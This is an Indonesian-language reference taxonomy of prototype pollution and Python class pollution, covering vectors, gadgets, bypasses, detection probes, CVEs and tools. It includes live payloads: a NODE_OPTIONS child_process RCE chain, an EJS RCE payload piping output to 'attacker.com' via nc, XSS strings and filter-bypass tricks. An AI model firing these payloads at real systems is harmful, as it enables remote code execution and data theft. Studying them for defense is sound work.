---
title: "Prototype Pollution"
description: ""
---

## Struktur Klasifikasi

Prototype Pollution adalah kelas kerentanan yang berakar pada model pewarisan berbasis prototype di JavaScript, di mana penyerang menyuntikkan properti sembarang ke dalam root prototype sebuah objek (`Object.prototype`) saat runtime. Karena semua objek JavaScript mewarisi dari `Object.prototype`, satu keberhasilan pollution mengkontaminasi setiap objek dalam aplikasi, memungkinkan serangan mulai dari Denial of Service hingga Remote Code Execution.

Taksonomi ini mengorganisasi ruang mutasi secara penuh di sepanjang tiga sumbu:

**Sumbu 1 — Pollution Vector (BAGAIMANA prototype di-pollute):** Mekanisme struktural melalui mana data yang dikendalikan penyerang mencapai rantai prototype. Ini adalah sumbu utama yang membentuk bagian utama dokumen.

**Sumbu 2 — Exploitation Gadget (APA yang dipicu setelah pollution):** Jenis code gadget yang membaca dari prototype yang terpollute dan menghasilkan efek yang sensitif terhadap keamanan. Sumbu lintas ini menjelaskan MENGAPA setiap pollution penting — tanpa gadget yang dapat dijangkau, pollution sendiri tidak berdampak.

**Sumbu 3 — Attack Scenario (DI MANA ia dipersenjatai):** Konteks penerapan dan kelas dampak yang menentukan tingkat keparahan di dunia nyata.

### Ringkasan Sumbu 2 — Jenis Gadget

| Jenis Gadget | Mekanisme | Dampak Tipikal |
|---|---|---|
| **Property Override** | Aplikasi membaca properti yang tidak terdefinisi, menerima nilai penyerang | Auth bypass, manipulasi konfigurasi |
| **Template/AST Injection** | Template engine mengonsumsi node AST yang terpollute atau opsi compiler | RCE via kompilasi template |
| **Child Process Injection** | Proses yang di-spawn mewarisi env vars atau argumen yang terpollute | RCE via `child_process` |
| **Environment Variable Injection** | Properti yang terpollute bocor ke `process.env` milik child process | RCE, privilege escalation |
| **Path/File Manipulation** | Path file atau resolusi modul membaca nilai yang terpollute | Path traversal, arbitrary file read |
| **DOM Sink Activation** | DOM API browser mengonsumsi properti yang terpollute | XSS, script injection |
| **Sanitizer Bypass** | Konfigurasi sanitizer keamanan ditimpa via properti yang terpollute | XSS, filter bypass |
| **Denial of Service** | Properti runtime yang kritis ditimpa | Crash aplikasi, infinite loop |

### Mekanisme Fundamental

Rantai prototype JavaScript bekerja sebagai berikut: ketika sebuah properti diakses pada objek dan tidak ditemukan, engine melintasi `obj.__proto__` → `Object.prototype` → `null`. Jika penyerang menulis `Object.prototype.isAdmin = true`, maka setiap objek yang tidak mendefinisikan `isAdmin` secara eksplisit akan mengembalikan `true`. Mekanisme tunggal ini mendasari seluruh kelas kerentanan.

Pollution itu sendiri bersifat inert — kerusakan membutuhkan sebuah **gadget**: jalur kode apa pun yang membaca properti yang tidak terdefinisi dan menggunakannya dalam operasi yang sensitif terhadap keamanan. Pemisahan antara **pollution source** (Sumbu 1) dan **exploitation gadget** (Sumbu 2) sangat fundamental untuk memahami attack surface ini.

---

## §1. Operasi Recursive Merge / Deep Copy

Vektor pollution yang paling umum. Fungsi apa pun yang secara rekursif menyalin properti dari objek sumber ke objek tujuan tanpa memvalidasi kunci dapat menjadi titik masuk pollution.

### §1-1. Unsafe Deep Merge

Ketika sebuah fungsi merge menemukan objek bersarang, ia turun secara rekursif ke sub-objek. Jika sumber mengandung `__proto__` sebagai kunci, merge mengikutinya ke dalam `Object.prototype` dan menugaskan properti di sana.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Injeksi kunci `__proto__`** | `merge({__proto__: {isAdmin: true}}, target)` melintasi ke dalam `Object.prototype` | Fungsi merge tidak memfilter `__proto__` |
| **Traversal `constructor.prototype`** | `merge({constructor: {prototype: {isAdmin: true}}}, target)` mencapai `Object.prototype` via rantai constructor | Fungsi merge tidak memfilter `constructor` |
| **Bypass `__proto__` bersarang** | Input seperti `__pro__proto__to__` melewati sanitasi string single-pass yang menghapus `__proto__` satu kali | Sanitizer menggunakan string replacement non-rekursif |
| **Traversal path dot-notation** | Library yang menerima path `a.b.c` (mis. `lodash.set()`, `dset()`) mengizinkan `__proto__.polluted` | Setter berbasis path tidak memblokir kunci prototype |

**Contoh — merge `__proto__`:**
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

**Contoh — merge `constructor.prototype`:**
```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

**Library yang terpengaruh (historis dan terbaru):** `lodash.merge`, `lodash.set`, `lodash.setWith`, `lodash.defaultsDeep`, `dset`, `deep-merge`, `deepmerge`, `mini-deep-assign`, `hoek`, `mixin-deep`, `merge-deep`, `defaults-deep`, `@75lb/deep-merge`, `@agreejs/shared`.

### §1-2. Unsafe Deep Clone / Copy

Operasi deep clone membuat objek baru dengan menyalin semua properti secara rekursif. Logika traversal yang sama yang membuat merge rentan berlaku pada operasi clone.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Recursive clone pollution** | Fungsi clone menyalin properti `__proto__` ke dalam rantai prototype objek baru | Clone menggunakan `for...in` tanpa pemeriksaan `hasOwnProperty` |
| **Round-trip `JSON.parse()`** | `JSON.parse('{"__proto__":{"x":1}}')` membuat objek dengan properti own `__proto__`; merge selanjutnya ke objek lain menyebabkan pollution | Objek yang di-parse di-merge, bukan digunakan secara langsung |
| **Spread operator dengan `__proto__` bersarang** | Spread dangkal `{...obj}` aman untuk tingkat atas tetapi `__proto__` bersarang bertahan jika kemudian di-deep-merge | Pemrosesan multi-langkah di mana shallow copy mengalir ke deep merge |

### §1-3. Property Assignment via Path Notation

Library yang mendukung pengaturan properti bersarang via path string (mis. `a.b.c` atau `a[b][c]`) rentan ketika path mengandung segmen yang mengakses prototype.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Dot-path setter** | `set(obj, '__proto__.polluted', 'value')` | Library tidak memvalidasi segmen path |
| **Bracket-path setter** | `set(obj, ['__proto__', 'polluted'], 'value')` | Path berbasis array mengizinkan elemen `__proto__` |
| **Notasi campuran** | `set(obj, 'constructor.prototype.polluted', 'value')` | Tidak ada pemfilteran `constructor` pada path |

**Library yang terpengaruh:** `lodash.set`, `lodash.setWith`, `dset`, `pydash.set_` (ekuivalen Python), `object-path`, `dot-prop` (versi lama).

---

## §2. Titik Masuk Deserialisasi Input Pengguna

Kategori ini mencakup mekanisme melalui mana data yang dikendalikan penyerang masuk ke aplikasi dalam bentuk yang dapat memicu pollution saat diproses.

### §2-1. Parsing JSON Body

Titik masuk paling langsung. HTTP request body yang di-parse dengan `JSON.parse()` secara alami mendukung `__proto__` sebagai kunci karena JSON memperlakukan semua kunci sebagai string sembarang.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **JSON body langsung** | POST body `{"__proto__":{"admin":true}}` di-parse dan di-merge ke dalam objek konfigurasi/pengguna | Express/Koa/Fastify dengan body-parser dan merge selanjutnya |
| **JSON bersarang dalam field string** | Sebuah field string mengandung JSON yang kemudian di-parse: `{"data":"{\"__proto__\":{\"x\":1}}"}` | Pola double-parsing |
| **Parsing JSON5** | Parser JSON5 (mis. paket `json5`) secara historis rentan terhadap prototype pollution selama parsing itu sendiri | Versi parser dengan CVE (mis. GHSA-9c47-m6qq-7p4h) |

### §2-2. Parsing URL Query String

Parser query string kustom yang mendukung pembuatan objek bersarang sangat berbahaya karena memungkinkan penentuan struktur objek yang dalam dari parameter URL.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Notasi bracket** | `?__proto__[isAdmin]=true` di-parse menjadi `{__proto__: {isAdmin: 'true'}}` | Query parser mendukung bracket nesting (mis. `qs`, `jQuery.deparam`) |
| **Notasi dot** | `?__proto__.isAdmin=true` | Query parser mendukung dot-based nesting |
| **Notasi array index** | `?__proto__[0]=value` diperlakukan sebagai penugasan objek | Parser mengonversi indeks numerik menjadi kunci objek |

### §2-3. Parsing URL Fragment / Hash

Aplikasi sisi klien sering mem-parse hash URL untuk mengekstrak parameter konfigurasi atau state.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Parsing parameter hash** | `#__proto__[transport_url]=data:,alert(1)` | Kode sisi klien mem-parse fragment dengan fungsi bertipe deparam yang rentan |
| **Injeksi hash-based routing** | Router SPA mengekstrak parameter dari hash dan menyatukannya ke dalam objek state | Router menggunakan unsafe merge untuk hidrasi state |

### §2-4. Pemrosesan FormData

Pengiriman form HTML dan data multipart dapat mengodekan objek bersarang melalui konvensi penamaan field.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Form field bernama bracket** | `<input name="__proto__[isAdmin]" value="true">` | Parser form sisi server membangun objek bersarang dari nama field (mis. tRPC `formDataToObject`, CVE-2025-68130) |
| **Form field bernama dot** | `<input name="__proto__.isAdmin" value="true">` | Parser mendukung dot notation untuk nesting |

### §2-5. Input GraphQL / API-Spesifik

GraphQL dan format API terstruktur lainnya dapat mengirimkan payload yang menyebabkan prototype pollution melalui mekanisme input asli mereka.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Variabel mutation GraphQL** | Objek variabel yang mengandung kunci `__proto__` di-merge ke dalam model backend | Backend menyatukan variabel mentah tanpa sanitasi |
| **gRPC/Protocol Buffer ke JSON** | Konversi proto-ke-JSON menghasilkan objek dengan kunci `__proto__` | Deserializer tidak memfilter kunci prototype |

### §2-6. Deserialisasi Protokol React Server Components (RSC)

Vektor modern yang kritis di mana protokol RSC Flight mendeserialkan payload yang dapat melintasi rantai prototype.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Injeksi payload RSC** | Payload deserialisasi yang dibuat khusus mengeksploitasi traversal rantai prototype untuk mengakses constructor `Function` | React 19.0–19.2.0, versi Next.js yang terpengaruh (CVE-2025-55182 / CVE-2025-66478, CVSS 10.0) |
| **Pollution argumen Server Function** | Argumen Server Action yang dideserialkan tanpa validasi memungkinkan manipulasi prototype | Aplikasi menggunakan React Server Components dengan server functions |

---

## §3. Mekanisme Binding Framework dan Library

Framework yang secara otomatis mengikat input pengguna ke objek internal menciptakan vektor pollution implisit.

### §3-1. Rantai Middleware Express.js / Koa / Fastify

Express dan framework serupa mem-parse query string dan request body menjadi objek JavaScript yang mengalir melalui rantai middleware.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Nesting library `qs`** | Query parser default Express (`qs`) mendukung objek bersarang: `?a[b][c]=1` | Konfigurasi Express default dengan merge selanjutnya |
| **Body parser + merge** | `req.body` dari middleware JSON `body-parser` di-merge ke dalam objek aplikasi | Aplikasi menyatukan input pengguna tanpa pemfilteran kunci |
| **Bypass parameter limit** | Mempollute `parameterLimit` mengubah cara `qs` mem-parse request berikutnya | Pollution sisi server bertahan lintas request |

### §3-2. Binding ORM / Database

Layer Object-Relational Mapping yang menerima pasangan key-value sembarang dari input pengguna dan memetakannya ke properti model.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Bypass skema Mongoose** | Skema non-strict menerima `__proto__` sebagai field, di-merge selama `Object.assign` | Skema tidak menggunakan `strict: true` |
| **Injeksi filter query** | Operator query MongoDB disuntikkan via properti yang terpollute: `{__proto__: {$gt: ""}}` | Objek filter dibangun dari input pengguna tanpa sanitasi |

### §3-3. tRPC / Next.js App Router

Framework full-stack modern dengan binding input otomatis.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **tRPC `formDataToObject`** | Memproses nama field FormData secara rekursif dengan notasi bracket/dot tanpa sanitasi kunci `__proto__`, `constructor`, atau `prototype` | tRPC 10.27.0–10.45.2, 11.0.0–11.7.0 (CVE-2025-68130) |
| **Next.js `experimental_nextAppDirCaller`** | Caller App Router memproses input pengguna melalui deserialisasi yang rentan | Menggunakan API caller eksperimental |

---

## §4. Vektor Pollution Sisi Klien

Prototype pollution sisi klien menarget lingkungan JavaScript browser, biasanya dapat dieksploitasi melalui manipulasi URL tanpa autentikasi.

### §4-1. Parsing URL-ke-Objek

Library sisi klien yang mengonversi parameter URL menjadi objek JavaScript.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pollution `jQuery.deparam()`** | Mem-parse query string menjadi objek bersarang: `?__proto__[innerHTML]=<img/src/onerror=alert(1)>` | Halaman menyertakan jQuery BBQ atau library deparam serupa |
| **Parser URL kustom** | Parser spesifik aplikasi yang memisah pada `[` dan `.` tanpa perlindungan prototype | Konversi URL-ke-objek kustom apa pun |
| **Penyalahgunaan `URLSearchParams`** | Aplikasi melakukan iterasi `URLSearchParams` dan membangun objek bersarang via parsing bracket | Konstruksi objek bersarang manual dari parameter URL |

### §4-2. DOM Gadget Sisi Klien

Setelah pollution sisi klien berhasil, DOM gadget mengonversi pollution menjadi dampak yang terlihat.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Override `innerHTML`** | Properti `innerHTML` yang terpollute dikonsumsi oleh library manipulasi DOM | Library membaca `innerHTML` dari objek konfigurasi/opsi |
| **`transport_url` / script `src`** | Properti URL yang terpollute disuntikkan sebagai sumber skrip: `data:,alert(1)` | Aplikasi secara dinamis membuat elemen skrip dari opsi |
| **Override `srcdoc` / `sandbox`** | Atribut iframe dibaca dari prototype yang terpollute | Aplikasi membuat iframe dengan opsi dari objek |
| **Injeksi event handler** | Atribut `onerror`, `onload` dibaca dari prototype yang terpollute | Elemen dibuat dengan atribut dari opsi yang tidak divalidasi |

### §4-3. Gadget Library Pihak Ketiga

Library sisi klien yang banyak digunakan mengandung gadget yang dapat dieksploitasi ketika prototype terpollute.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Bypass DOMPurify** | Mempollute `ALLOWED_TAGS`, `ALLOW_DATA_ATTR`, atau properti konfigurasi serupa melewati sanitasi | Versi DOMPurify tertentu di mana konfigurasi dibaca dari prototype |
| **Gadget Google Closure** | Library Closure membaca properti yang tidak terdefinisi dari prototype untuk operasi DOM | Halaman menggunakan Google Closure |
| **Backbone.js / Marionette.js** | Rendering template membaca opsi dari prototype | Aplikasi menggunakan Backbone dengan template sisi klien |
| **Adobe DTM (Dynamic Tag Management)** | Tag manager membaca konfigurasi dari properti yang terpollute | Halaman menyertakan skrip Adobe DTM |
| **Gadget jQuery** | Berbagai plugin jQuery membaca opsi dari properti yang diwarisi prototype | Plugin menggunakan pola `$.extend(true, defaults, options)` |

---

## §5. Gadget Eksploitasi Sisi Server (Node.js)

Gadget yang paling berdampak ada di runtime Node.js itu sendiri dan di library sisi server, memungkinkan eskalasi dari prototype pollution ke RCE.

### §5-1. Gadget Modul `child_process`

Modul `child_process` adalah sink RCE utama. Ketika child process di-spawn, properti prototype yang terpollute bocor ke lingkungan dan argumen proses.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Injeksi properti `shell`** | Mempollute properti `shell` menyebabkan `spawn()` menggunakan shell yang dikendalikan penyerang: `{__proto__: {shell: "/proc/self/environ"}}` | Aplikasi memanggil `child_process.spawn()` atau `fork()` |
| **Injeksi `NODE_OPTIONS`** | Mempollute `NODE_OPTIONS` dengan `--require /proc/self/environ` menyebabkan child process Node.js memuat kode yang dikendalikan penyerang | Child process adalah program Node.js; lingkungan Linux mengekspos `/proc/self/environ` |
| **Injeksi `argv0`** | Mempollute `argv0` mengontrol argumen pertama yang terlihat oleh proses yang di-spawn | `child_process.spawn()` atau `fork()` tanpa `argv0` eksplisit |
| **Injeksi properti `env`** | Mempollute `env` menyuntikkan environment variable ke child process: `{__proto__: {env: {NODE_OPTIONS: "--require /tmp/evil.js"}}}` | Child process apa pun yang di-spawn tanpa opsi `env` eksplisit |
| **Manipulasi `execPath`** | Mempollute `execPath` mengontrol binary mana yang dieksekusi untuk `fork()` | `child_process.fork()` tanpa `execPath` eksplisit |
| **Manipulasi `cwd`** | Mempollute `cwd` mengubah direktori kerja untuk proses yang di-spawn | Operasi child process yang bergantung pada path |

**Rantai eksploitasi klasik:**
```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /proc/self/environ",
    "env": {
      "NODE_OPTIONS": "--require /proc/self/environ",
      "A": "console.log(require('child_process').execSync('id').toString())//"
    }
  }
}
```

### §5-2. Gadget Template Engine

Template engine mengompilasi template menjadi kode yang dapat dieksekusi, dan banyak yang membaca opsi compiler dari properti objek yang dapat dipollute.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Override `escapeFunction` EJS** | Mempollute `client` dan `escapeFunction` menyuntikkan kode ke dalam fungsi template yang dikompilasi | Aplikasi menggunakan EJS untuk rendering (CVE di EJS v3.1.10) |
| **Injeksi `outputFunctionName` EJS** | Mempollute `outputFunctionName` menyuntikkan kode sembarang ke dalam output kompilasi template | Template EJS dikompilasi dengan opsi yang terpollute |
| **Injeksi AST Pug** | Mempollute properti node AST (mis. `block.type`, `line`) memodifikasi output template yang dikompilasi | Aplikasi menggunakan template engine Pug/Jade |
| **Injeksi helper Handlebars** | Mempollute `allowProtoPropertiesByDefault` atau jalur resolusi helper | Aplikasi menggunakan Handlebars |
| **Injeksi filter/extension Nunjucks** | Mempollute definisi filter atau path ekstensi | Aplikasi menggunakan Nunjucks |

**Contoh — RCE EJS:**
```json
{
  "__proto__": {
    "client": 1,
    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc attacker.com 4444')"
  }
}
```

### §5-3. Universal Gadget Level Runtime

Gadget yang ditemukan dalam source code runtime Node.js dan Deno itu sendiri (bukan di library pihak ketiga). Ini disebut "universal" karena memengaruhi aplikasi apa pun yang berjalan di runtime yang rentan.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Arbitrary Code Execution (19 gadget di Node.js)** | Fungsi runtime membaca opsi yang tidak terdefinisi dari prototype, mencapai `eval()`, `Function()`, atau `child_process` | Prototype pollution apa pun dalam aplikasi Node.js (GHunter, USENIX 2024) |
| **Privilege Escalation (31 gadget di Node.js)** | Properti yang terpollute memodifikasi pemeriksaan izin, kontrol akses file system, atau konfigurasi jaringan | Versi runtime dengan gadget yang belum di-patch |
| **Path Traversal (13 gadget di Node.js)** | Resolusi path file membaca komponen yang terpollute | Operasi file tanpa normalisasi path eksplisit |
| **Gadget Runtime Deno (67 gadget)** | Meskipun model keamanan berbasis izin Deno, gadget ada di API internal yang melewati pembatasan sumber daya ketika izin diberikan | Aplikasi Deno dengan izin relevan yang diberikan |
| **Undefined-oriented Programming (UoP)** | Metodologi sistematis untuk menemukan gadget prototype pollution dengan mengidentifikasi jalur kode yang membaca properti yang nilainya `undefined` pada eksekusi normal. Karena pollution `Object.prototype` hanya memengaruhi pencarian properti yang seharusnya mengembalikan `undefined`, UoP secara tepat memetakan semua "undefined property sink" dalam codebase dan menelusuri jalurnya ke operasi yang sensitif terhadap keamanan. Ini mengubah penemuan gadget dari code review manual menjadi masalah analisis yang skalabel, mengungkap gadget yang tidak terlihat oleh analisis taint tradisional karena properti yang terpollute tidak memiliki sumber eksplisit dalam kode aplikasi | Runtime JavaScript apa pun; metodologi diterapkan ke Node.js dan paket npm utama untuk menemukan gadget yang sebelumnya tidak diketahui (Yinzhi Cao et al., USENIX 2024) |

### §5-4. Gadget `require()` dan Resolusi Modul

Sistem modul Node.js membaca konfigurasi resolusi dari properti objek.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pollution field `main`** | Mempollute `main` mengalihkan resolusi modul ke file yang dikendalikan penyerang | Aplikasi menggunakan `require()` pada sebuah direktori |
| **Pollution field `exports`** | Mempollute `exports` memodifikasi resolusi subpath | Resolusi ekspor ESM atau kondisional |
| **Pollution `paths`** | Mempollute `require.resolve.paths` atau path modul | Pemuatan modul dinamis dari path yang dipengaruhi pengguna |

---

## §6. Analogi Non-JavaScript (Class Pollution)

Konsep prototype pollution meluas melampaui JavaScript ke bahasa dinamis lain di mana atribut kelas dapat dimodifikasi saat runtime.

### §6-1. Python Class Pollution

Model atribut dinamis Python memungkinkan traversal melalui `__class__`, `__base__`, `__init__`, dan `__globals__` untuk mencapai dan memodifikasi state kelas dan modul sembarang.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Traversal `__class__`** | `instance.__class__.__qualname__ = 'Polluted'` memodifikasi definisi kelas untuk semua instance | Fungsi merge melintasi atribut, bukan hanya item dict |
| **Pemanjatan rantai `__base__`** | `instance.__class__.__base__.__base__.attr = value` mempollute kelas induk | Hierarki pewarisan yang dalam dengan basis yang tidak terlindungi |
| **Akses `__globals__`** | `instance.__init__.__globals__['secret_key'] = 'attacker_value'` mengakses variabel level modul | Atribut fungsi apa pun mengekspos `__globals__` |
| **Pollution `__kwdefaults__`** | Menimpa default parameter keyword-only mengubah perilaku fungsi untuk semua pemanggil | Fungsi merge mengizinkan traversal `__kwdefaults__` |
| **Injeksi `os.environ`** | `__init__.__globals__['subprocess']['os']['environ']['COMSPEC'] = 'cmd /c calc'` membajak resolusi perintah subprocess | Lingkungan Windows, impor `subprocess` yang dapat diakses dalam globals |

**Contoh — payload Python class pollution:**
```json
{
  "__class__": {
    "__init__": {
      "__globals__": {
        "SECRET_KEY": "attacker_controlled",
        "app": {
          "config": {
            "SECRET_KEY": "attacker_controlled"
          }
        }
      }
    }
  }
}
```

**Library yang terpengaruh:** `pydash.set_()`, `pydash.set_with()`, fungsi recursive merge kustom yang menggunakan `setattr()`.

### §6-2. Ruby / Bahasa Dinamis Lainnya

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Open class Ruby** | Model open class Ruby memungkinkan modifikasi runtime dari kelas apa pun | Mass assignment tanpa strong parameters |
| **`__wakeup` PHP / magic method** | Deserialisasi memicu magic method yang memodifikasi state kelas | Deserialisasi tidak aman dari input pengguna |

---

## §7. Teknik Bypass Sanitasi

Pertahanan terhadap prototype pollution sering melibatkan sanitasi input, tetapi banyak implementasi yang dapat dilewati.

### §7-1. Bypass Pemfilteran Kunci

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **`constructor.prototype` alih-alih `__proto__`** | Blocklist memfilter `__proto__` tetapi tidak `constructor` | Blocklist kunci yang tidak lengkap |
| **Bypass string bersarang** | `__pro__proto__to__` setelah single-pass strip menjadi `__proto__` | Sanitasi string non-rekursif |
| **Normalisasi Unicode** | Varian `__proto__` yang dikodekan (`\u005f\u005fproto\u005f\u005f`) melewati perbandingan string | Parser menormalisasi Unicode setelah pemeriksaan filter |
| **Variasi huruf** | `__PROTO__` atau `__Proto__` pada sistem case-insensitive | Parser case-insensitive tetapi filter case-sensitive |
| **Computed property name** | `{["__prot"+"o__"]: {x:1}}` melewati analisis statis | Konstruksi kunci properti saat runtime |

### §7-2. Bypass Struktural

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **JSON.parse lalu merge** | `JSON.parse()` mempertahankan `__proto__` sebagai properti own; merge selanjutnya menyebabkan pollution | Pemrosesan dua langkah: parse lalu merge |
| **Beberapa lapisan encoding** | URL-encoding, base64, atau pembungkus JSON bersarang menyembunyikan `__proto__` dari filter luar | Input melewati beberapa tahap dekode |
| **Koersi array-ke-objek** | Array dengan indeks numerik yang dikoersi ke objek selama merge; `{0: {__proto__: {x:1}}}` bersarang di posisi array | Fungsi merge memproses array dan objek secara identik |
| **Override prototype method** | Mempollute `String.prototype.includes` agar selalu mengembalikan `false` melewati pemeriksaan `if (key.includes('__proto__'))` | Pemeriksaan keamanan bergantung pada prototype method (CVE-2024-29016 di `locutus`) |

### §7-3. Penghindaran Deteksi (Sisi Server)

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pemicu asinkron** | Pollution terjadi pada satu request; gadget dipicu pada request berikutnya yang tidak terkait | Prototype pollution bertahan dalam memori proses Node.js |
| **Pollution lintas-worker** | Worker thread berbagi rantai prototype dengan thread utama | Aplikasi menggunakan `worker_threads` |
| **Pemicu dependensi pihak ketiga** | Sumber pollution ada dalam kode aplikasi; gadget ada dalam dependensi yang tidak terkait | Graf dependensi yang kompleks dengan rantai prototype yang digunakan bersama |

---

## §8. Teknik Deteksi dan Probing Non-Destruktif

Teknik untuk mengidentifikasi prototype pollution tanpa menyebabkan denial of service.

### §8-1. Probe Non-Destruktif Sisi Server

| Teknik | Mekanisme | Sinyal Deteksi |
|---|---|---|
| **Override `json spaces`** | Pollute properti `json spaces` → respons JSON mendapat indentasi ekstra | Perubahan format respons (spesifik Express.js) |
| **Override status code** | Pollute `status` atau `statusCode` → kode respons HTTP berubah | Status HTTP non-standar dikembalikan |
| **Override charset** | Pollute charset `content-type` → encoding respons berubah | Header Content-Type menyertakan charset yang tidak terduga |
| **Refleksi `__proto__`** | Pollute sebuah properti dan periksa apakah ia muncul dalam objek respons | Nilai yang terpollute tercermin dalam respons API |
| **Deteksi async callback** | Pollute `shell`/`NODE_OPTIONS` dengan payload Burp Collaborator → deteksi callback DNS/HTTP dari child process | Interaksi out-of-band diterima |

### §8-2. Deteksi Sisi Klien

| Teknik | Mekanisme | Sinyal Deteksi |
|---|---|---|
| **DOM Invader (Burp Suite)** | Ekstensi browser otomatis yang mem-fuzz parameter URL dengan payload prototype pollution | Peringatan konsol browser, modifikasi DOM |
| **Property canary** | Setel `Object.prototype.canary = 'test'` via parameter URL dan periksa `({}).canary === 'test'` di konsol | Properti canary dapat diakses pada objek baru |

---

## Pemetaan Attack Scenario (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama | Dampak Tipikal |
|---|---|---|---|
| **Client-Side XSS** | Browser, SPA, halaman apa pun dengan library JS yang rentan | §4 + §2-2/§2-3 | DOM XSS, pencurian data, pembajakan sesi |
| **Server-Side RCE** | Aplikasi Node.js dengan child_process atau template engine | §1 + §2-1 + §5 | Kompromi server penuh |
| **Bypass Autentikasi/Otorisasi** | Backend JS apa pun dengan kontrol akses berbasis konfigurasi | §1 + §2-1 | Privilege escalation, akses tidak sah |
| **Denial of Service** | Aplikasi JS apa pun (server atau klien) | §1 + §2-1 | Crash aplikasi, resource exhaustion |
| **Cache Poisoning** | CDN/proxy yang men-cache respons API JSON | §1 + §2-1 → perubahan yang dapat diamati §8-1 | Melayani respons yang terracuni kepada semua pengguna |
| **Supply Chain Attack** | Ekosistem npm, dependensi transitif dengan merge yang rentan | §1-1 (dalam dependensi) | Memengaruhi semua konsumen downstream |
| **Cross-Framework RCE (RSC)** | React 19 + Next.js App Router | §2-6 | Pre-auth RCE (CVSS 10.0) |
| **Kompromi Aplikasi Python** | Flask/Django dengan recursive merge | §6-1 + custom merge | Pencurian secret key, RCE |

---

## Pemetaan CVE / Bounty (2023–2025)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|---|---|---|
| §2-6 (deserialisasi RSC) | CVE-2025-55182 / CVE-2025-66478 (React/Next.js) | **CVSS 10.0**. Pre-auth RCE yang memengaruhi React 19.0–19.2.0 dan Next.js. Eksploitasi publik tersedia; eksploitasi di alam liar terdeteksi Desember 2025. |
| §3-3 (tRPC FormData) | CVE-2025-68130 (@trpc/server) | Prototype pollution via `formDataToObject`. Memengaruhi tRPC 10.27.0–10.45.2, 11.0.0–11.7.0. Auth bypass, DoS. |
| §1-1 (lodash) | CVE-2025-13465 (lodash) | Prototype pollution dalam fungsi `_.unset`/`_.omit` (penghapusan properti via path `__proto__` yang dibuat khusus). |
| §1-3 (dset path setter) | CVE-2024-21529 (dset) | Prototype pollution via fungsi `dset()`, sanitasi input yang tidak tepat. |
| §7-2 (override prototype method) | CVE-2024-29016 (locutus) | Pemeriksaan keamanan `parse_str` dilewati dengan mempollute `String.prototype.includes`. |
| §1-1 (deep-merge) | CVE-2024-38986 (@75lb/deep-merge) | Semua versi rentan karena bergantung pada lodash merge yang rentan. |
| §1-1 (web3-utils) | CVE-2024-21505 (web3-utils) | Fungsi `format()` dan `mergeDeep()` rentan. Tingkat keparahan tinggi. |
| §4 + §5-1 (requirejs) | CVE-2024-38999 (requirejs) | RCE via `s.contexts._.configure`. CVSS 9.8. |
| §1-1 (mini-deep-assign) | CVE-2024-38983 (mini-deep-assign) | Prototype pollution dalam fungsi merge. |
| §5-1 + §5-3 (runtime Node.js) | 63 gadget dilaporkan (USENIX 2024) | 19 ACE, 31 privilege escalation, 13 gadget path traversal di inti Node.js. |
| §5-3 (runtime Deno) | 67 gadget dilaporkan (USENIX 2024) | Meskipun model izin Deno, gadget melewati pembatasan sumber daya ketika izin diberikan. |
| §5-1 (NPM CLI, Parse Server, Rocket.Chat) | 8 RCE yang dapat dieksploitasi (USENIX 2023) | Full RCE di tiga aplikasi profil tinggi via universal gadget. |
| §5-2 (EJS) | RCE di EJS v3.1.10 | Gadget `escapeFunction`/`outputFunctionName`. RCE kompilasi template. |
| §5-1 (Kibana) | CVE-2019-7609 (Kibana) | Penanda sejarah: injeksi env `child_process.spawn` → RCE. |
| §4-3 + §4-1 (HubSpot) | Bug bounty | $4.000. Client-side PP via `jQuery.deparam`, perbaikan awal dilewati. |
| §4-1 (Lodash bounty) | Bug bounty | $250. Pollution method `zipObjectDeep()`. |
| §4-1 (Web3 game) | Bug bounty | $175. Client-side PP di platform game blockchain. |

---

## Alat Deteksi

| Alat | Cakupan Target | Teknik Inti |
|---|---|---|
| **Server-Side Prototype Pollution Scanner** (PortSwigger) | Aplikasi Node.js sisi server | Probing non-destruktif via override `json spaces`, `status`, `charset`; deteksi async via `--inspect` |
| **DOM Invader** (PortSwigger / Burp Suite) | JS browser sisi klien | Fuzzing parameter URL otomatis dengan payload prototype pollution, penemuan gadget |
| **ppfuzz** (berbasis Rust) | Aplikasi web sisi klien | Pemindaian cepat untuk prototype pollution sisi klien via injeksi parameter URL |
| **GHunter** (KTH) | Runtime JavaScript (Node.js, Deno) | Engine V8 yang dimodifikasi dengan analisis taint dinamis untuk menemukan universal gadget runtime |
| **Silent Spring** (KTH) | Library dan aplikasi Node.js | Analisis taint statis multi-label (berbasis CodeQL) untuk mengidentifikasi sumber pollution dan universal gadget |
